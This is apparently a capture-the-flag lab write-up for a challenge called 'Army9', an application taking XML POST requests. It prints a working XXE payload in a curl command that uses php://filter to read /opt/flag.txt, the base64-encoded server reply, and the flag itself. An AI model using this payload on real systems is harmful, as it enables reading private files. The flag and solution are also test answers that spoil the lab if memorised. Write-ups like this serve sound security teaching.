# Army9

>
> ### user: PWNX{baa53c20dfaec391c3934fc26f37ca18}
> 

## Description

An application which accepts XML Post Requests

## Technical description

The application doesn't parses any external entity that isn't a php://filter.

## Writeup

The challenge presents only the port `80/tcp` open. Since the application accepts XML POST requests an attacker can try to use external entities to trigger the application to make request or read file inside the system. The only external entities being parsed by the application are those who uses the php://filter, so in order to exploit the lab and obtain the flag the attacker can use the following exploit

```bash
curl 10.90.140.93 -H 'Content-Type: application/xml' -d '<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/opt/flag.txt">]><foo>&xxe;</foo>

```

The application response at this point will be the following


```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/opt/flag.txt">
]>
<foo>UFdOWHtiYWE1M2MyMGRmYWVjMzkxYzM5MzRmYzI2ZjM3Y2ExOH0K</foo>
```
